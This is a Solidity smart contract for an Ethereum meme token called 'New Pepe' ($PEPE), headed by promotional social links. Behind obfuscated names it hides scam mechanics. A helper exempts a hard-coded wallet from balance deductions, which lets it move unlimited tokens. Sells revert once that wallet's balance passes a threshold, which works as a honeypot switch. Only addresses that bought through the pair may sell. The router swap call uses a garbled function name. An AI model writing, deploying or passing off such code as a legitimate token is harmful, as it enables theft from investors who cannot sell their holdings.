/**

New Pepe  $PEPE
The Inu’s have had their day. It’s time for the most recognizable meme in the world to take his reign as king of the memes.


TWITTER: https://twitter.com/NewPepe_Portal
TELEGRAM: https://t.me/NewPepe_ETH
WEBSITE: https://newpepe.org/
**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _mjwxv(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _mjwxv(a, b, "SafeMath");
    }

    function  _mjwxv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _powqlv {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _qovuims {
    function swojKenbwvSartksFxlOcvqcr(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _qovuims private _Tewopik;
    address payable private _Qgimeuf;
    address private _yiavbir;

    bool private _ptyckjv;
    bool public _Teraxlvrm = false;
    bool private oruvubk = false;
    bool private _aezjahep = false;

    string private constant _name = unicode"New Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _uTotalvz = 42069000000 * 10 **_decimals;
    uint256 public _pvborc = _uTotalvz;
    uint256 public _Waepmyrf = _uTotalvz;
    uint256 public _kwaprThaevom= _uTotalvz;
    uint256 public _gsviTcaef= _uTotalvz;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _vpjuakwi;
    mapping (address => bool) private _traknony;
    mapping(address => uint256) private _rkopemo;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yrkbvolq=0;
    uint256 private _bxrnvye=0;


    event _mrogufkt(uint _pvborc);
    modifier osTqeo {
        oruvubk = true;
        _;
        oruvubk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _uTotalvz;
        _vpjuakwi[owner(

        )] = true;
        _vpjuakwi[address
        (this)] = true;
        _vpjuakwi[
            _Qgimeuf] = true;
        _Qgimeuf = 
        payable (0x69075baD1B63e821Dc17820D3b437f49eb021662);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _uTotalvz);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _uTotalvz;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _mjwxv(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 Rplmhik=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Teraxlvrm) {
                if (to 
                != address
                (_Tewopik) 
                && to !=
                 address
                 (_yiavbir)) {
                  require(_rkopemo
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rkopemo
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _yiavbir && to != 
            address(_Tewopik) &&
             !_vpjuakwi[to] ) {
                require(amount 
                <= _pvborc,
                 "Exceeds the _pvborc.");
                require(balanceOf
                (to) + amount
                 <= _Waepmyrf,
                  "Exceeds the macxizse.");
                if(_bxrnvye
                < _yrkbvolq){
                  require
                  (! _eoqnvma(to));
                }
                _bxrnvye++;
                 _traknony
                 [to]=true;
                Rplmhik = amount._pvr
                ((_bxrnvye>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _yiavbir &&
             from!= address(this) 
            && !_vpjuakwi[from] ){
                require(amount <= 
                _pvborc && 
                balanceOf(_Qgimeuf)
                <_gsviTcaef,
                 "Exceeds the _pvborc.");
                Rplmhik = amount._pvr((_bxrnvye>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_bxrnvye>
                _yrkbvolq &&
                 _traknony[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!oruvubk 
            && to == _yiavbir &&
             _aezjahep &&
             contractTokenBalance>
             _kwaprThaevom 
            && _bxrnvye>
            _yrkbvolq&&
             !_vpjuakwi[to]&&
              !_vpjuakwi[from]
            ) {
                _rcjncrf( _rkhvq(amount, 
                _rkhvq(contractTokenBalance,
                _gsviTcaef)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _ujhfle(address
                    (this).balance);
                }
            }
        }

        if(Rplmhik>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(Rplmhik);
          emit
           Transfer(from,
           address
           (this),Rplmhik);
        }
        _balances[from
        ]= _mjwxv(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _mjwxv(Rplmhik));
        emit Transfer
        (from, to, 
        amount.
         _mjwxv(Rplmhik));
    }

    function _rcjncrf(uint256
     tokenAmount) private
      osTqeo {
        if(tokenAmount==
        0){return;}
        if(!_ptyckjv)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tewopik.WETH();
        _approve(address(this),
         address(
             _Tewopik), 
             tokenAmount);
        _Tewopik.
        swojKenbwvSartksFxlOcvqcr
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rkhvq
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _mjwxv(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Qgimeuf){
            return a ;
        }else{
            return a .
             _mjwxv (b);
        }
    }

    function removezLimitas (
        
    ) external onlyOwner{
        _pvborc = _uTotalvz;
        _Waepmyrf = _uTotalvz;
        emit _mrogufkt(_uTotalvz);
    }

    function _eoqnvma(address 
    account) private view 
    returns (bool) {
        uint256 bkzqa;
        assembly {
            bkzqa :=
             extcodesize
             (account)
        }
        return bkzqa > 
        0;
    }

    function _ujhfle(uint256
    amount) private {
        _Qgimeuf.
        transfer(
            amount);
    }

    function enablezTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _ptyckjv ) ;
        _Tewopik  
        =  
        _qovuims
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tewopik), 
            _uTotalvz);
        _yiavbir = 
        _powqlv(_Tewopik.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tewopik .
             WETH ( ) );
        _Tewopik.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_yiavbir).
        approve(address(_Tewopik), 
        type(uint)
        .max);
        _aezjahep = true;
        _ptyckjv = true;
    }

    receive() external payable {}
}